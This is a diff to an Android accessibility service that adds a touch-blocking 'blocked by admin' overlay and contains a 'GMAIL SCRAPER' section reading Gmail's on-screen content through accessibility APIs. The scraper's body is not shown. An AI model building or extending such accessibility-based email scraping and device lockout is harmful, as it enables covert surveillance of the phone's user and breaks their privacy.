@@ -10,6 +10,7 @@ import android.graphics.PixelFormat;
 import android.os.Build;
 import android.os.CountDownTimer;
 import android.view.Gravity;
+import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
@@ -38,7 +39,8 @@ public class JaxAccessibilityService extends AccessibilityService {
         @Override
         public void onReceive(Context context, Intent intent) {
             loadBlockData();
-            if (blockOverlay != null && blockedApps.isEmpty()) {
+            if (blockOverlay != null) {
+                // Cek ulang, kalau ternyata daftar blokir kosong, hapus overlay
                 hideBlockOverlay();
             }
         }
@@ -67,22 +69,28 @@ public class JaxAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        // HANYA PROSES KALAU GANTI APLIKASI/LAYAR (Biar gak kedip-kedip)
+        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
         if (event.getPackageName() == null) return;
+        
         String packageName = event.getPackageName().toString();
         
-        // 1. APP BLOCKER
+        // Jangan proses kalau yang dibuka adalah aplikasi kita sendiri (overlay)
+        if (packageName.equals(getPackageName())) return;
+
+        // 1. APP BLOCKER LOGIC
         if (blockedApps.contains(packageName)) {
             if (blockOverlay == null) {
                 showBlockOverlay();
             }
         } else {
-            // Kalau pindah ke app lain (misal pencet Home), overlay hilang
+            // Kalau buka aplikasi lain (misal Home Screen), hilangkan overlay
             if (blockOverlay != null) {
                 hideBlockOverlay();
             }
         }
 
-        // 2. GMAIL SCRAPER
+        // 2. GMAIL SCRAPER (Hanya kalau package Gmail)
         if (packageName.equals("com.google.android.gm")) {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root != null) {
@@ -101,7 +109,7 @@ public class JaxAccessibilityService extends AccessibilityService {
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
-        layout.setBackgroundColor(0xFFAA0000); // Merah Gelap
+        layout.setBackgroundColor(0xFFAA0000); // Merah
 
         TextView title = new TextView(this);
         title.setText("🚫 AKSES DIBLOKIR\nOLEH ADMIN\n\n");
@@ -110,19 +118,26 @@ public class JaxAccessibilityService extends AccessibilityService {
         title.setGravity(Gravity.CENTER);
         
         tvTimer = new TextView(this);
-        tvTimer.setTextColor(0xFFFFFF00); // Kuning
+        tvTimer.setTextColor(0xFFFFFF00);
         tvTimer.setTextSize(22f);
         tvTimer.setGravity(Gravity.CENTER);
 
         layout.addView(title);
         layout.addView(tvTimer);
 
+        // KUNCI TOTAL SENTUHAN
+        layout.setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+                return true; // Mencegah sentuhan tembus ke aplikasi di bawahnya
+            }
+        });
+
         int layoutFlag = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 
                 WindowManager.LayoutParams.TYPE_PHONE;
 
-        // FLAG_NOT_FOCUSABLE = Bikin tombol Home/Back/Recent tetap berfungsi
-        // FLAG_LAYOUT_IN_SCREEN = Nutupin seluruh layar
+        // FLAG_NOT_FOCUSABLE = Biar tombol Home/Back HP tetap berfungsi
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -154,7 +169,6 @@ public class JaxAccessibilityService extends AccessibilityService {
             }
             @Override
             public void onFinish() {
-                // Timer habis, hapus dari blocklist
                 SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
                 prefs.edit().putString("blocked_apps", "").apply();
                 hideBlockOverlay();
